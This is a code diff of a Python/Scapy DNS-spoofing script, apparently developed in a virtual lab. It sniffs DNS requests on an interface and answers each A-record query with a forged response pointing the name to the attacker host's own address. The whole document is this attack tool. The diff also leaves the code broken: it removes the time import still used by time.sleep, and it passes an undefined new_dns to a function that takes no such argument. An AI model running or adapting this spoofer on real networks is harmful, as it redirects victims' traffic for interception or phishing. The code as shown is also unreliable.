@@ -1,12 +1,11 @@
 from scapy.all import *
-import time
+from dataclasses import dataclass
 
+"""For testing, these need to come from the main tool / arguments eventually"""
 #INTERFACE: str = 'enp10s0u1u3u3'
 INTERFACE: str = 'vboxnet0'
+NEW_DNS: str = get_if_addr(INTERFACE)
 
-IP_GATEWAY: str = '192.168.2.254'
-IP_OWN: str = '192.168.56.1'
-NEW_DNS: str = '192.168.2.15'
 
 def recordTypeIdToName(id: int) -> str:
     """
@@ -30,17 +29,18 @@ def recordTypeIdToName(id: int) -> str:
         return str(id)
 
 def isIncoming(pkt: Packet) -> bool:
-    """Filter to check, whether a packet is incoming, and not from this interface"""
+    """Filter to check, whether a packet is (supposedly) incoming, and not from this interface"""
     return pkt[Ether].src != get_if_hwaddr(INTERFACE)
 
 def get_spoof_packet(req_pkt: Packet, name: str, recordType: str) -> Packet:
+    """Generate one spoofed DNS response packet in response to a particular request"""
     res_pkt: Packet = (
         IP(src=req_pkt[IP].dst, dst=req_pkt[IP].src) /
         UDP(sport=req_pkt[IP].dport, dport=req_pkt[IP].sport)
     )
 
     if recordType == 1:
-        # A
+        # type: A
         res_pkt /= DNS(id=req_pkt[DNS].id, an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=NEW_DNS))
     else:
         print(f'Type {recordTypeIdToName(recordType)} not supported, generating empty packet...')
@@ -49,6 +49,7 @@ def get_spoof_packet(req_pkt: Packet, name: str, recordType: str) -> Packet:
 
 
 def spoof_dns(pkt: Packet) -> None:
+    """For a sniffed DNS packet, generate and send spoofed DNS responses for each requested record"""
     if pkt and DNS in pkt:
         for i in range(int(pkt[DNS].qdcount)):
             # qdcount = the number of requested records
@@ -56,15 +57,15 @@ def spoof_dns(pkt: Packet) -> None:
             recordType = pkt[DNS].qd[i].qtype
             print(f'Received DNS request from {pkt[IP].src} for {name} of type {recordTypeIdToName(recordType)}')
 
-            res_pkt = get_spoof_packet(pkt, name, recordType)
+            res_pkt = get_spoof_packet(pkt, name, recordType, new_dns)
             send(res_pkt, iface=INTERFACE)
 
 
 if __name__ == '__main__':
-
     try:
         while True:
             pkt = sniff(iface=INTERFACE, prn=spoof_dns, lfilter=isIncoming, timeout=1)
+            # Sleeping to allow for keyboard interrupt during testing. Looking into better way to do this...
             time.sleep(0.5)
     except KeyboardInterrupt:
         print("\nExit...")
